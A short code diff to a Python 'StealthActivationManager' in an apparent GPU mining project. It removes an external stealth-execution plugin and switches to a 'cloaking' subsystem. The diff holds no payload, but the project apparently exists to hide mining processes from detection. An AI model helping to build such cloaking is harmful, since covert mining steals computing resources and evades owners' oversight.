@@ -35,7 +35,6 @@ sys.path.insert(0, str(project_root))
 
 # Import required modules
 try:
-    from mining_environment.stealth.plugins.stealth_exec import StealthExecution
     from mining_environment.scripts.unified_logging import get_unified_logger
     from mining_environment.scripts.auxiliary_modules.event_bus import EventBus
 except ImportError as e:
@@ -66,8 +65,7 @@ class StealthActivationManager:
         self.active_stealth_processes: Dict[int, Dict[str, Any]] = {}
         self.stealth_lock = threading.Lock()
         
-        # **[External Stealth System]** (hệ thống stealth ngoài)
-        self.external_stealth: Optional[StealthExecution] = None
+        # **[External Stealth System]** (hệ thống stealth ngoài) - simplified tracking
         self.external_stealth_enabled = False
         
         # **[Event Listeners]** (listeners sự kiện)
@@ -85,10 +83,8 @@ class StealthActivationManager:
         try:
             self.logger.info("🚀 [STEALTH-ACTIVATION] Initializing stealth activation system...")
             
-            # **Step 1**: Initialize external stealth system
-            success = self._initialize_external_stealth()
-            if not success:
-                self.logger.warning("⚠️ [STEALTH-ACTIVATION] External stealth unavailable - using self-stealth only")
+            # **Step 1**: External stealth system removed - using gpu_plugins/cloaking/ instead
+            self.logger.info("🔧 [STEALTH-ACTIVATION] External stealth removed - using gpu_plugins/cloaking/ system")
             
             # **Step 2**: Setup EventBus subscriptions
             self._setup_eventbus_subscriptions()
